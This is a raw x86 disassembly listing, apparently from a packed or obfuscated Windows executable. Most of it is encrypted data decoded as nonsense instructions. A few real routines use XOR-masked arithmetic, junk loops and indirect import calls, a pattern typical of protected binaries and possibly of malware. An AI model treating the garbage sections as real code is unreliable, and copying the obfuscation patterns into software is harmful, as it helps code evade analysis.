  40d0b4:	or     al,0xf
  40d0b6:	mov    ds,WORD PTR [eax-0xd]
  40d0b9:	cli    
  40d0ba:	shl    eax,cl
  40d0bc:	adc    eax,0x2d88b4ba
  40d0c1:	dec    ecx
  40d0c2:	out    0x9f,eax
  40d0c4:	sti    
  40d0c5:	jne    0x40d0b9
  40d0c7:	and    ecx,DWORD PTR [ecx]
  40d0c9:	add    al,0xee
  40d0cb:	aas    
  40d0cc:	mov    edi,0x44027f63
  40d0d1:	(bad)  [edi+0x76]
  40d0d4:	adc    bh,ah
  40d0d6:	and    eax,edi
  40d0d8:	popa   
  40d0d9:	sbb    dl,BYTE PTR [ecx+0xc9fa565]
  40d0df:	mov    DWORD PTR [ebx-0x3e],0x45da0eaa
  40d0e6:	sbb    bl,ah
  40d0e8:	stc    
  40d0e9:	dec    ecx
  40d0ea:	and    ebp,DWORD PTR [edx-0x56]
  40d0ed:	xor    dh,BYTE PTR [ebp+0x4ffaaf73]
  40d0f3:	int3   
  40d0f4:	adc    DWORD PTR [eax-0x65],eax
  40d0f7:	out    0xe6,al
  40d0f9:	push   eax
  40d0fa:	pop    ss
  40d0fb:	mov    ds,WORD PTR [ecx+ebx*4+0x63]
  40d0ff:	enter  0xff7a,0x2a
  40d103:	test   BYTE PTR [eax-0x3606e42d],0x16
  40d10a:	sub    DWORD PTR [edx-0x6794696f],ebp
  40d110:	cmp    edx,esp
  40d112:	jne    0x40d0b7
  40d114:	mov    esp,DWORD PTR [edi-0x5b]
  40d117:	xchg   esp,eax
  40d118:	out    0x37,al
  40d11a:	push   es
  40d11b:	sub    bh,BYTE PTR [edx+0x69]
  40d11e:	lock pushf 
  40d120:	inc    DWORD PTR [esi]
  40d122:	jl     0x40d0c8
  40d124:	or     DWORD PTR [ebx-0x6f],esp
  40d127:	inc    ebx
  40d128:	inc    ebx
  40d129:	fldenv [ecx-0x62]
  40d12c:	adc    al,0x3a
  40d12e:	xchg   esp,eax
  40d12f:	xchg   ebx,eax
  40d130:	mov    ds:0x4de14762,eax
  40d135:	xchg   ebp,eax
  40d136:	jl     0x40d16a
  40d138:	iret   
  40d139:	adc    ebp,edx
  40d13b:	pop    es
  40d13c:	push   ebp
  40d13d:	adc    BYTE PTR [ecx+eiz*4-0x42],dl
  40d141:	and    BYTE PTR [esi+eax*8],cl
  40d144:	loope  0x40d0fb
  40d146:	cwde   
  40d147:	retf   
  40d148:	mov    ebx,0xb27fce4d
  40d14d:	pop    es
  40d14e:	and    al,0xdd
  40d150:	xor    eax,0x7adeb215
  40d155:	mov    ds:0x5bd2a2e2,al
  40d15a:	shl    BYTE PTR [edx-0x21966983],cl
  40d160:	popf   
  40d161:	xlat   BYTE PTR ds:[ebx]
  40d162:	sar    BYTE PTR [esi-0x7e],cl
  40d165:	mov    cl,bh
  40d167:	rcl    DWORD PTR [ebp+ecx*1+0x70],1
  40d16b:	mov    al,ds:0xb8d8cedd
  40d170:	inc    eax
  40d171:	mov    ebx,0xb129fd14
  40d176:	clc    
  40d177:	or     al,0xa2
  40d179:	mov    dh,0x93
  40d17b:	jbe    0x40d1ae
  40d17d:	xchg   edx,eax
  40d17e:	repnz push cs
  40d180:	iret   
  40d181:	adc    cl,bl
  40d183:	mov    bl,0x4
  40d185:	mov    edx,0xc1e5db37
  40d18a:	ins    BYTE PTR es:[edi],dx
  40d18b:	mov    WORD PTR [esi+0x13a1dcff],es
  40d191:	jno    0x40d204
  40d193:	sub    eax,0x21726e35
  40d198:	mov    edx,0x81d48522
  40d19d:	pop    edx
  40d19e:	arpl   WORD PTR [ebx+0x418f1965],cx
  40d1a4:	dec    ebp
  40d1a5:	shr    BYTE PTR [edi+edx*1-0x13daf197],1
  40d1ac:	adc    ch,bl
  40d1ae:	std    
  40d1af:	test   DWORD PTR [ebx],ecx
  40d1b1:	aam    0x57
  40d1b3:	aas    
  40d1b4:	push   ecx
  40d1b5:	adc    cl,BYTE PTR [ebx+0x66]
  40d1b8:	fmul   QWORD PTR [ebx+0xe2bb172]
  40d1be:	sub    ch,BYTE PTR [ebx]
  40d1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1c1:	je     0x40d1e4
  40d1c3:	jg     0x40d1c4
  40d1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1c6:	nop
  40d1c7:	(bad)  
  40d1c8:	(bad)  
  40d1c9:	and    eax,0x1683c302
  40d1ce:	and    cl,BYTE PTR [edx-0x7]
  40d1d1:	dec    edx
  40d1d2:	and    BYTE PTR [ecx-0xbaeacf],cl
  40d1d8:	in     al,dx
  40d1d9:	cmp    DWORD PTR [edi],ebx
  40d1db:	je     0x40d217
  40d1dd:	sub    al,BYTE PTR [ebx]
  40d1df:	lods   eax,DWORD PTR ds:[esi]
  40d1e0:	call   0x34bb:0x8ccdeed9
  40d1e7:	cmp    DWORD PTR [esi+ecx*2],edi
  40d1ea:	pop    esi
  40d1eb:	xchg   BYTE PTR [edi],ch
  40d1ed:	jae    0x40d206
  40d1ef:	mov    ecx,0x9afbae6e
  40d1f4:	pop    edx
  40d1f5:	pusha  
  40d1f6:	mov    bh,bh
  40d1f8:	shr    ecx,cl
  40d1fa:	hlt    
  40d1fb:	cmp    eax,0xba9931ff
  40d200:	push   edi
  40d201:	lea    ebp,[ebp-0x6]
  40d204:	rsqrtps xmm0,XMMWORD PTR [ecx+0x22f336cc]
  40d20b:	push   edi
  40d20c:	mov    ebp,ebp
  40d20e:	dec    ebx
  40d20f:	cmp    ebp,DWORD PTR [edi+0x9]
  40d212:	mov    esp,0xb7371fa9
  40d217:	push   ecx
  40d218:	(bad)  
  40d219:	pop    ebx
  40d21a:	fimul  DWORD PTR [ebp-0x6202a382]
  40d220:	iret   
  40d221:	xchg   BYTE PTR [edx+eiz*2],ah
  40d224:	je     0x40d277
  40d226:	and    esp,DWORD PTR [edx-0x4290d5e2]
  40d22c:	mov    BYTE PTR [ecx+0x52d466de],bl
  40d232:	add    DWORD PTR [ecx-0x62],ecx
  40d235:	jbe    0x40d26b
  40d237:	pushw  0x27e2
  40d23b:	cmc    
  40d23c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d23d:	cmp    ebx,DWORD PTR [edi]
  40d23f:	mov    DWORD PTR [esi+0xd],ebp
  40d242:	aam    0xd2
  40d244:	lahf   
  40d245:	dec    ch
  40d247:	call   0xe268:0x2721cf6d
  40d24e:	imul   ebp,eax,0xffffffff
  40d251:	call   0x85e94f22
  40d256:	pop    ss
  40d257:	sub    edi,eax
  40d259:	xchg   edi,eax
  40d25a:	cmp    al,0xed
  40d25c:	adc    eax,0xfe1ab4ca
  40d261:	scas   al,BYTE PTR es:[edi]
  40d262:	push   0xffffff9c
  40d264:	dec    eax
  40d265:	xchg   ecx,eax
  40d266:	inc    esi
  40d267:	adc    ecx,DWORD PTR [ebx+0x7a]
  40d26a:	mov    ebp,0xfc2afd6d
  40d26f:	sbb    dl,BYTE PTR [esi]
  40d271:	rol    BYTE PTR [edi],cl
  40d273:	and    DWORD PTR [esi+0x1],eax
  40d276:	in     al,dx
  40d277:	std    
  40d278:	lahf   
  40d279:	and    eax,0xefad97b
  40d27e:	mov    esp,0xc033187d
  40d283:	or     BYTE PTR [esi],cl
  40d285:	out    0x2e,al
  40d287:	pop    esi
  40d288:	xchg   ecx,eax
  40d289:	test   DWORD PTR [esi-0x37bf3320],0xe45ba04
  40d293:	dec    ecx
  40d294:	out    dx,eax
  40d295:	call   0x167543ab
  40d29a:	sbb    edi,DWORD PTR [si-0x464c]
  40d29f:	ficom  WORD PTR [edi+eax*2]
  40d2a2:	pop    ebp
  40d2a3:	jmp    0x66a0b2df
  40d2a8:	retf   0x7ad9
  40d2ab:	add    al,0x1b
  40d2ad:	loop   0x40d307
  40d2af:	pop    edi
  40d2b0:	and    BYTE PTR [eax-0x7e],cl
  40d2b3:	pop    edi
  40d2b4:	adc    eax,0x875df932
  40d2b9:	xor    eax,0x46cdec2
  40d2be:	jg     0x40d2da
  40d2c0:	ficomp DWORD PTR [ebx]
  40d2c2:	pushf  
  40d2c3:	fstp   QWORD PTR [esi-0x7c18b864]
  40d2c9:	std    
  40d2ca:	scas   eax,DWORD PTR es:[edi]
  40d2cb:	pop    edi
  40d2cc:	push   0x9c21025b
  40d2d1:	lds    esi,FWORD PTR [ecx]
  40d2d3:	jle    0x40d348
  40d2d5:	xchg   esi,eax
  40d2d6:	jno    0x40d2f1
  40d2d8:	xchg   DWORD PTR [ebx],ecx
  40d2da:	xchg   BYTE PTR [ecx],al
  40d2dc:	test   DWORD PTR [ecx-0x47],0x5dc7382a
  40d2e3:	xchg   DWORD PTR [ebp+0x29],ebx
  40d2e6:	add    DWORD PTR [ecx],ebp
  40d2e8:	sbb    al,0x89
  40d2ea:	fwait
  40d2eb:	cmp    esi,0x36e0031d
  40d2f1:	dec    eax
  40d2f2:	(bad)  
  40d2f3:	idiv   dl
  40d2f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f6:	or     eax,0x610b6bf
  40d2fb:	(bad)  
  40d2fd:	inc    DWORD PTR [eax+0x40b92170]
  40d303:	sbb    DWORD PTR [edi-0x22],0xffffffa2
  40d307:	push   esi
  40d308:	sub    BYTE PTR [esi+0x648bfa3],cl
  40d30e:	fsub   st,st(3)
  40d310:	adc    ch,BYTE PTR [edi]
  40d312:	mov    eax,0xa5501ea2
  40d317:	das    
  40d318:	adc    al,0xab
  40d31a:	xchg   BYTE PTR [ebp+0x2577b41f],ah
  40d320:	test   DWORD PTR [ebp+0x52],esi
  40d323:	cli    
  40d324:	ins    BYTE PTR es:[edi],dx
  40d325:	pop    edx
  40d326:	cwde   
  40d327:	(bad)  
  40d328:	jno    0x40d35f
  40d32a:	xchg   BYTE PTR [edx],bh
  40d32c:	into   
  40d32d:	outs   dx,DWORD PTR ds:[esi]
  40d32e:	dec    esp
  40d32f:	fsubr  DWORD PTR [esi+ebp*2]
  40d332:	sbb    bl,bh
  40d334:	mov    al,0x58
  40d336:	cmp    BYTE PTR [edi+0x3ff294e3],ch
  40d33c:	ins    DWORD PTR es:[edi],dx
  40d33d:	inc    eax
  40d33e:	xchg   ecx,eax
  40d33f:	mov    ds:0xa5c77017,al
  40d344:	mov    esp,cs
  40d346:	mov    ds:0x2b5c4baf,eax
  40d34b:	push   edi
  40d34c:	xchg   ebx,eax
  40d34d:	in     al,dx
  40d34e:	loop   0x40d33c
  40d350:	push   0xffffffab
  40d352:	push   edx
  40d353:	jg     0x40d3ab
  40d355:	and    bh,BYTE PTR [edx+0x31efca87]
  40d35b:	loop   0x40d3dc
  40d35d:	pop    esp
  40d35e:	jmp    0x40d3a7
  40d360:	sub    eax,DWORD PTR [esi]
  40d362:	mov    bh,0x1c
  40d364:	(bad)  
  40d366:	fadd   DWORD PTR [ecx+0x38]
  40d369:	xor    DWORD PTR [edi+0x12],ecx
  40d36c:	sbb    edx,edi
  40d36e:	sbb    esp,ebp
  40d370:	dec    edx
  40d371:	cmp    al,0x10
  40d373:	test   DWORD PTR [ebx+0x5],ecx
  40d376:	or     eax,0x454b1070
  40d37b:	sub    cl,bh
  40d37d:	bound  eax,QWORD PTR [eax]
  40d37f:	add    BYTE PTR [edi],al
  40d381:	outs   dx,DWORD PTR ds:[esi]
  40d382:	fsubr  st(1),st
  40d384:	cld    
  40d385:	mov    edi,DWORD PTR [ebp-0xc]
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	out    0x92,al
  40d3c8:	retf   
  40d3c9:	xchg   ebx,eax
  40d3ca:	outs   dx,DWORD PTR ds:[esi]
  40d3cb:	cwde   
  40d3cc:	jl     0x40d44a
  40d3ce:	retf   0x7c79
  40d3d1:	jl     0x40d36c
  40d3d3:	das    
  40d3d4:	fist   DWORD PTR [edi-0x26]
  40d3d7:	test   al,0xfb
  40d3d9:	das    
  40d3da:	hlt    
  40d3db:	sub    BYTE PTR [ebx+0x400cff19],dl
  40d3e1:	loopne 0x40d366
  40d3e3:	sub    esp,DWORD PTR [eax+0x5a]
  40d3e6:	cmc    
  40d3e7:	push   es
  40d3e8:	xor    BYTE PTR [ebp+0x71],dl
  40d3eb:	pushf  
  40d3ec:	adc    bl,BYTE PTR [ecx-0x57aa826a]
  40d3f2:	and    DWORD PTR [eax-0x51],esp
  40d3f5:	dec    esi
  40d3f6:	xor    BYTE PTR [ebp-0x468070a6],bl
  40d3fc:	stc    
  40d3fd:	jb     0x40d400
  40d3ff:	gs mov al,bh
  40d402:	iret   
  40d403:	outs   dx,DWORD PTR ds:[esi]
  40d404:	fst    QWORD PTR [esi+0x1e3ccbb5]
  40d40a:	mov    DWORD PTR [edx-0x20],0x644894c7
  40d411:	push   edx
  40d412:	std    
  40d413:	inc    ebp
  40d414:	push   es
  40d415:	leave  
  40d416:	daa    
  40d417:	test   BYTE PTR [edi+esi*8-0x37],ah
  40d41b:	aaa    
  40d41c:	sub    DWORD PTR [esi+0x67d84760],ecx
  40d422:	dec    esp
  40d423:	popf   
  40d424:	shr    BYTE PTR [ecx+0x2727f19],cl
  40d42a:	lea    eax,[edi+0x52]
  40d42d:	shr    DWORD PTR [edx-0x92ee1ec],1
  40d433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d434:	shr    DWORD PTR [ebp-0x6ed42393],cl
  40d43a:	add    DWORD PTR [esp+ebx*8],edi
  40d43d:	jmp    0xfbec4c4e
  40d442:	cmp    eax,0xbf770ef0
  40d447:	or     eax,0xe8106482
  40d44c:	xchg   edx,eax
  40d44d:	aam    0xa7
  40d44f:	rcr    DWORD PTR [ebx+0x6cc44d56],cl
  40d455:	rcl    BYTE PTR [esi-0x3468f010],cl
  40d45b:	inc    esi
  40d45c:	xchg   edx,eax
  40d45d:	arpl   WORD PTR [ebx],bp
  40d45f:	sbb    esp,DWORD PTR [ebx+0x2a17f9f8]
  40d465:	mov    eax,0x7f08a704
  40d46a:	push   ss
  40d46b:	adc    ebp,esi
  40d46d:	lahf   
  40d46e:	cld    
  40d46f:	pop    esp
  40d470:	sub    BYTE PTR [eax+0x195cfbc5],dh
  40d476:	mov    eax,0x7683df1d
  40d47b:	mov    al,0x6a
  40d47d:	lds    edx,FWORD PTR [ecx-0x29dd687b]
  40d483:	jg     0x40d474
  40d485:	js     0x40d4e5
  40d487:	ss std 
  40d489:	and    eax,0x50e2568b
  40d48e:	push   ebp
  40d48f:	cmp    bh,BYTE PTR [ebp+0x5079904c]
  40d495:	dec    edx
  40d496:	mov    ah,0xb8
  40d498:	mov    BYTE PTR [edi],cl
  40d49a:	shl    dh,cl
  40d49c:	xor    BYTE PTR [eax],ah
  40d49e:	push   es
  40d49f:	rol    DWORD PTR [ebx+0x49024ac3],0x53
  40d4a6:	pop    esi
  40d4a7:	push   es
  40d4a8:	sar    DWORD PTR [ebp-0x7c],0x47
  40d4ac:	push   ds
  40d4ad:	or     edi,DWORD PTR [esi]
  40d4af:	jne    0x40d519
  40d4b1:	arpl   WORD PTR [ebx+0x109da4b9],bx
  40d4b7:	js     0x40d495
  40d4b9:	stos   DWORD PTR es:[edi],eax
  40d4ba:	inc    ebx
  40d4bb:	jmp    0xbcb8:0x9d4610ef
  40d4c2:	rol    ecx,1
  40d4c4:	mov    ah,0x0
  40d4c6:	cmp    al,0xb2
  40d4c8:	and    eax,DWORD PTR [esi-0x6d]
  40d4cb:	fcmovbe st,st(6)
  40d4cd:	(bad)  
  40d4ce:	aam    0xfe
  40d4d0:	add    DWORD PTR [esi],ebp
  40d4d2:	push   ebx
  40d4d3:	cmp    al,0x84
  40d4d5:	in     eax,0x14
  40d4d7:	dec    ebp
  40d4d8:	aam    0x5d
  40d4da:	in     eax,dx
  40d4db:	adc    al,0xb8
  40d4dd:	pop    es
  40d4de:	mov    bh,0x53
  40d4e0:	mov    DWORD PTR [esi],edx
  40d4e2:	aam    0xfd
  40d4e4:	popf   
  40d4e5:	ds or  al,0xd7
  40d4e8:	fld    TBYTE PTR [ecx+0x32]
  40d4eb:	out    0x4b,eax
  40d4ed:	mov    BYTE PTR [ebx],0xf9
  40d4f0:	data16 cld 
  40d4f2:	sbb    bh,BYTE PTR [esi+0x105f2790]
  40d4f8:	scas   eax,DWORD PTR es:[edi]
  40d4f9:	sub    DWORD PTR [edi],0x6e75bbd8
  40d4ff:	mov    ebx,0xe81dcb3e
  40d504:	cmp    DWORD PTR [ecx],ebp
  40d506:	aaa    
  40d507:	int3   
  40d508:	dec    esi
  40d509:	cmp    eax,0xb3361e3c
  40d50e:	test   al,0xe9
  40d510:	cld    
  40d511:	push   ds
  40d512:	test   eax,0xee8d885b
  40d517:	sti    
  40d518:	into   
  40d519:	cmp    eax,esi
  40d51b:	xlat   BYTE PTR ds:[ebx]
  40d51c:	cmp    dl,BYTE PTR [esi]
  40d51e:	xor    esp,0x6b
  40d521:	out    0xa7,eax
  40d523:	out    0x9f,eax
  40d525:	add    al,0x2e
  40d527:	(bad)  
  40d528:	jns    0x40d4d3
  40d52a:	inc    ebp
  40d52b:	xchg   DWORD PTR [ecx+0x48],edi
  40d52e:	pushf  
  40d52f:	adc    eax,0xacebf0c5
  40d534:	aam    0xc2
  40d536:	ins    BYTE PTR es:[edi],dx
  40d537:	fidivr DWORD PTR [edx+0x7b63ff80]
  40d53d:	mov    edi,0xe1e723fa
  40d542:	sub    al,0x38
  40d544:	mov    ds:0x6e3cd31,al
  40d549:	push   ebp
  40d54a:	push   eax
  40d54b:	jnp    0x40d590
  40d54d:	mov    ds:0x2d012dc4,eax
  40d552:	inc    edi
  40d553:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d555:	xchg   edx,eax
  40d556:	sar    BYTE PTR [edi-0x47c6ecf7],cl
  40d55c:	cmp    al,0x5f
  40d55e:	jo     0x40d56f
  40d560:	inc    edi
  40d561:	loopne 0x40d5c6
  40d563:	and    eax,0x9979b608
  40d568:	dec    esp
  40d569:	sbb    ebx,DWORD PTR [eax-0x4b]
  40d56c:	sub    cl,dl
  40d56e:	cmp    DWORD PTR [edi-0x702f3d75],0x5e
  40d575:	or     BYTE PTR ds:[edx+0x3304a5f6],0x3f
  40d57d:	mov    ds:0xf96d6fb3,eax
  40d582:	out    0x60,eax
  40d584:	loope  0x40d5f1
  40d586:	outs   dx,DWORD PTR ds:[esi]
  40d587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d588:	test   BYTE PTR [ebp+0x6b],ch
  40d58b:	shr    esi,cl
  40d58d:	call   0x55cb3371
  40d592:	lahf   
  40d593:	sbb    al,0x4d
  40d595:	js     0x40d614
  40d597:	dec    esp
  40d598:	cmp    eax,0xaba51286
  40d59d:	sub    cl,BYTE PTR [esi]
  40d59f:	dec    ecx
  40d5a0:	adc    BYTE PTR [ecx],dl
  40d5a2:	cwde   
  40d5a3:	xor    ebx,ecx
  40d5a5:	mov    al,ds:0xfb83d245
  40d5aa:	pop    ebx
  40d5ab:	or     ebp,edi
  40d5ad:	fsub   QWORD PTR [edi+0x13]
  40d5b0:	inc    ebx
  40d5b1:	xor    al,0xd6
  40d5b3:	jge    0x40d5e1
  40d5b5:	scas   al,BYTE PTR es:[edi]
  40d5b6:	push   es
  40d5b7:	and    ch,BYTE PTR [ecx]
  40d5b9:	dec    edx
  40d5ba:	mov    ah,BYTE PTR ds:[esi+0x6]
  40d5be:	mov    edx,0x64829457
  40d5c3:	pop    edi
  40d5c4:	or     bh,dl
  40d5c6:	sub    al,0xf6
  40d5c8:	lea    edx,[ebp+0x26]
  40d5cb:	add    BYTE PTR [ebx+0x9],bh
  40d5ce:	iret   
  40d5cf:	shr    BYTE PTR [ebx],1
  40d5d1:	xor    ebp,esp
  40d5d3:	add    eax,DWORD PTR [ebp-0x146f8dc3]
  40d5d9:	and    al,0xdd
  40d5db:	sub    BYTE PTR [ecx],dh
  40d5dd:	xlat   BYTE PTR ds:[ebx]
  40d5de:	push   DWORD PTR [ecx-0x5c]
  40d5e1:	add    al,0xbf
  40d5e3:	out    0x18,al
  40d5e5:	xchg   DWORD PTR ds:[eax-0x17],ebx
  40d5e9:	fld    TBYTE PTR [edx+edi*8]
  40d5ec:	(bad)  
  40d5ed:	push   ss
  40d5ee:	push   ebp
  40d5ef:	push   ebp
  40d5f0:	mov    ebx,0xaaf5e6fb
  40d5f5:	xor    al,0xec
  40d5f7:	daa    
  40d5f8:	mov    al,0xc6
  40d5fa:	ret    0x395d
  40d5fd:	or     cl,BYTE PTR [eax+0x36]
  40d600:	out    0x9a,eax
  40d602:	leave  
  40d603:	push   ss
  40d604:	(bad)  
  40d606:	or     dh,0xbe
  40d609:	lock scas al,BYTE PTR es:[edi]
  40d60b:	sbb    DWORD PTR [ecx],ecx
  40d60d:	add    BYTE PTR [eax],dl
  40d60f:	cwde   
  40d610:	scas   al,BYTE PTR es:[edi]
  40d611:	inc    edx
  40d612:	lods   eax,DWORD PTR ds:[esi]
  40d613:	and    DWORD PTR [esp+eax*1-0x6b],esi
  40d617:	mov    al,0xc3
  40d619:	in     al,0x56
  40d61b:	mov    ebp,0x5d308504
  40d620:	sub    DWORD PTR [esi-0x7baacf4d],0x4334f39f
  40d62a:	pusha  
  40d62b:	mov    esi,0x8daf9865
  40d630:	les    edx,FWORD PTR [ebx+0x12]
  40d633:	push   ds
  40d634:	lods   al,BYTE PTR ds:[esi]
  40d635:	adc    eax,esi
  40d637:	jg     0x40d5cb
  40d639:	jne    0x40d6b3
  40d63b:	arpl   WORD PTR [ebx],cx
  40d63d:	out    0xeb,eax
  40d63f:	cmp    ah,BYTE PTR [ebp+0x50]
  40d642:	ins    BYTE PTR es:[edi],dx
  40d643:	jno    0x40d64a
  40d645:	jp     0x40d69b
  40d647:	pop    edx
  40d648:	call   0xf4d6ebb0
  40d64d:	in     eax,dx
  40d64e:	repz cmp eax,0x6b90ed8a
  40d654:	sub    ch,BYTE PTR [ecx+0x7b]
  40d657:	inc    eax
  40d658:	jbe    0x40d65c
  40d65a:	mov    ah,0xcf
  40d65c:	xor    BYTE PTR [eax+0x5edc6d0e],dl
  40d662:	jge    0x40d62a
  40d664:	into   
  40d665:	xchg   edi,eax
  40d666:	call   0x1d70dccf
  40d66b:	ror    BYTE PTR ss:[ebx-0x56d034a0],1
  40d672:	jo     0x40d61a
  40d674:	icebp  
  40d675:	ficom  DWORD PTR [edi]
  40d677:	cmovg  ecx,DWORD PTR [ebp+eax*1+0x30fbc71d]
  40d67f:	add    ecx,ecx
  40d681:	mov    edx,0xaf49e871
  40d686:	cld    
  40d687:	inc    esp
  40d688:	int3   
  40d689:	xchg   esp,eax
  40d68a:	call   0x97ac3395
  40d68f:	dec    ebp
  40d690:	sub    al,0xb8
  40d692:	scas   al,BYTE PTR es:[edi]
  40d693:	sahf   
  40d694:	lea    esp,[edi]
  40d696:	int    0xd0
  40d698:	dec    esi
  40d699:	xchg   ebp,eax
  40d69a:	push   0xffffffa4
  40d69c:	stc    
  40d69d:	sbb    ebp,DWORD PTR [edx+ecx*8-0x40]
  40d6a1:	sbb    eax,0xb4d7272f
  40d6a6:	adc    ebp,DWORD PTR [esi-0x80]
  40d6a9:	xor    ch,BYTE PTR [edx+0x7dfd756c]
  40d6af:	xchg   esp,eax
  40d6b0:	mov    ecx,0x13a226b
  40d6b5:	xor    eax,0xe91e0948
  40d6ba:	dec    ebx
  40d6bb:	xor    BYTE PTR [ebx+0x3f609b3e],bl
  40d6c1:	xor    al,0xf0
  40d6c3:	dec    edi
  40d6c4:	and    al,0xe6
  40d6c6:	jp     0x40d668
  40d6c8:	dec    ecx
  40d6c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ca:	mov    dl,0xe2
  40d6cc:	idiv   edx
  40d6ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6cf:	rol    DWORD PTR [edi-0x5eb2120b],cl
  40d6d5:	int    0xc0
  40d6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d8:	addr16 sbb al,0xd0
  40d6db:	cld    
  40d6dc:	sub    esp,DWORD PTR [edi-0x60]
  40d6df:	aam    0x91
  40d6e1:	xor    esp,DWORD PTR [esi]
  40d6e3:	mov    ds:0xce4a5909,eax
  40d6e8:	repz test DWORD PTR [eax-0x7af2612b],edi
  40d6ef:	xor    ebx,DWORD PTR ds:0xdc448941
  40d6f5:	ins    DWORD PTR es:[edi],dx
  40d6f6:	imul   edi,DWORD PTR [eax-0x342f14ec],0x800aad33
  40d700:	push   ds
  40d701:	jge    0x40d705
  40d703:	xlat   BYTE PTR ds:[ebx]
  40d704:	xor    al,0x70
  40d706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d707:	les    edi,FWORD PTR [esi-0x51]
  40d70a:	xchg   DWORD PTR [edi+0x38],ebx
  40d70d:	pop    ds
  40d70e:	or     bl,BYTE PTR [edx]
  40d710:	cmp    eax,0x4ad24bfe
  40d715:	and    ebp,DWORD PTR [eax]
  40d717:	xor    BYTE PTR [ecx],ch
  40d719:	sar    BYTE PTR [eax-0x125938ca],1
  40d71f:	mov    eax,0x1641d7fe
  40d724:	cmp    eax,0x33138fe2
  40d729:	rol    BYTE PTR [ebx],1
  40d72b:	ror    DWORD PTR [edi],1
  40d72d:	scas   eax,DWORD PTR es:[edi]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43369b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433663,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43371f,0x4336a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43364b,0x433763
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433723,0x43363f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4336b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4336b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4336b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4336b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4336b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433647,0x433767
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43364f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43364f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43364f,ecx
  40d852:	cmp    DWORD PTR ds:0x43364f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43364f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43364f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43364f
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43364f,ecx
  40d894:	jmp    0x40d845
